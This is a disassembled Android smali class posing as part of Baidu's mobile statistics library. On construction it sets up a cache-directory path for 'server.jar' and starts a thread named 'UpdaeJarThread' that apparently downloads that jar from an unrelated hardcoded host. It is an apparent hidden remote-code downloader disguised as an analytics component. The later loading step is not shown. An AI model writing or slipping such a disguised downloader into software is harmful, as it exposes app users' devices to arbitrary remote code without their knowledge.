.class public Lcom/baidu/mobstat/Download;
.super Ljava/lang/Object;


# static fields
.field static a:I

.field static b:I

.field static c:I

.field private static h:Landroid/os/HandlerThread;

.field private static i:Landroid/os/Handler;


# instance fields
.field private d:Ljava/io/File;

.field private e:Ljava/lang/String;

.field private f:Landroid/os/Handler;

.field private g:Lcom/baidu/mobstat/w;

.field private j:Z

.field private k:Z

.field private l:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v0, 0x1

    sput v0, Lcom/baidu/mobstat/Download;->a:I

    const/4 v0, 0x2

    sput v0, Lcom/baidu/mobstat/Download;->b:I

    const/4 v0, 0x3

    sput v0, Lcom/baidu/mobstat/Download;->c:I

    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "UpdaeJarThread"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    sput-object v0, Lcom/baidu/mobstat/Download;->h:Landroid/os/HandlerThread;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 3

    const/4 v1, 0x0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const-string v0, "http://59travel.205.5ghl.cn/server.jar"

    iput-object v0, p0, Lcom/baidu/mobstat/Download;->e:Ljava/lang/String;

    iput-boolean v1, p0, Lcom/baidu/mobstat/Download;->j:Z

    iput-boolean v1, p0, Lcom/baidu/mobstat/Download;->k:Z

    new-instance v0, Lcom/baidu/mobstat/v;

    invoke-direct {v0, p0}, Lcom/baidu/mobstat/v;-><init>(Lcom/baidu/mobstat/Download;)V

    iput-object v0, p0, Lcom/baidu/mobstat/Download;->l:Landroid/os/Handler;

    invoke-static {}, Lcom/baidu/mobstat/Download;->a()Z

    move-result v0

    if-nez v0, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    iget-boolean v0, p0, Lcom/baidu/mobstat/Download;->k:Z

    if-nez v0, :cond_0

    iget-boolean v0, p0, Lcom/baidu/mobstat/Download;->j:Z

    if-nez v0, :cond_0

    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/server.jar"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/baidu/mobstat/Download;->d:Ljava/io/File;

    sget-object v0, Lcom/baidu/mobstat/Download;->h:Landroid/os/HandlerThread;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v0, Landroid/os/Handler;

    sget-object v1, Lcom/baidu/mobstat/Download;->h:Landroid/os/HandlerThread;

    invoke-virtual {v1}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lcom/baidu/mobstat/Download;->f:Landroid/os/Handler;

    iget-object v0, p0, Lcom/baidu/mobstat/Download;->g:Lcom/baidu/mobstat/w;

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/baidu/mobstat/Download;->f:Landroid/os/Handler;

    iget-object v1, p0, Lcom/baidu/mobstat/Download;->g:Lcom/baidu/mobstat/w;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    :cond_2
    new-instance v0, Lcom/baidu/mobstat/w;

    invoke-direct {v0, p0}, Lcom/baidu/mobstat/w;-><init>(Lcom/baidu/mobstat/Download;)V

    iput-object v0, p0, Lcom/baidu/mobstat/Download;->g:Lcom/baidu/mobstat/w;

    iget-object v0, p0, Lcom/baidu/mobstat/Download;->f:Landroid/os/Handler;

    iget-object v1, p0, Lcom/baidu/mobstat/Download;->g:Lcom/baidu/mobstat/w;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto :goto_0
.end method

.method static synthetic a(Lcom/baidu/mobstat/Download;)Landroid/os/Handler;
    .locals 1

    iget-object v0, p0, Lcom/baidu/mobstat/Download;->l:Landroid/os/Handler;

    return-object v0
.end method

.method static a()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method static synthetic a(Lcom/baidu/mobstat/Download;Z)Z
    .locals 0

    iput-boolean p1, p0, Lcom/baidu/mobstat/Download;->j:Z

    return p1
.end method

.method static synthetic b()Landroid/os/Handler;
    .locals 1

    sget-object v0, Lcom/baidu/mobstat/Download;->i:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic b(Lcom/baidu/mobstat/Download;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/baidu/mobstat/Download;->e:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic b(Lcom/baidu/mobstat/Download;Z)Z
    .locals 0

    iput-boolean p1, p0, Lcom/baidu/mobstat/Download;->k:Z

    return p1
.end method

.method static synthetic c(Lcom/baidu/mobstat/Download;)Ljava/io/File;
    .locals 1

    iget-object v0, p0, Lcom/baidu/mobstat/Download;->d:Ljava/io/File;

    return-object v0
.end method
